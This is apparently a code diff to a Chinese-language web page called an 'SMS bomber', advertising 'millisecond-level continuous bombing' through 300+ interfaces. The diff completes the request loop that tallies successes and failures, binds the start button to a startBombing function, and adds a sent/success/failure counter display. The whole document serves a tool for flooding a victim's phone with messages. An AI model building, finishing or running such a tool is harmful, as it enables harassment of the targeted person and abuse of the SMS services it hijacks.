@@ -191,7 +191,7 @@
 <body>
 <div class="card">
     <h1>💣 短信轰炸机</h1>
-    <div class="sub"><span class="highlight">毫秒级</span>持续轰炸</div>
+    <div class="sub"><span class="highlight">毫秒级</span>持续轰炸 · 300+ 接口</div>
 
     <div class="input-group">
         <input type="password" id="phoneInput" placeholder="手机号" maxlength="11" inputmode="numeric">
@@ -1181,4 +1181,28 @@
                     pendingRequests--;
                     if (ok) successCount++;
                     else failCount++;
-                    updateStats
+                    updateStats();
+                });
+            }
+            updateStats();
+
+            // 如果定时器已停止，不再继续
+            if (!isRunning) return;
+
+        }, INTERVAL);
+    }
+
+    // 绑定开始按钮
+    sendBtn.addEventListener('click', startBombing);
+
+    // 初始状态显示
+    statusLabel.innerHTML = `
+        <div>就绪</div>
+        <div class="stats">
+            已发送: <span id="totalSent">0</span> &nbsp;|&nbsp; 成功: <span class="ok" id="successCount">0</span> &nbsp;|&nbsp; 失败: <span class="fail" id="failCount">0</span>
+        </div>
+        <div class="time-display" id="timeDisplay">⏱️ 00:00</div>
+    `;
+</script>
+</body>
+</html>
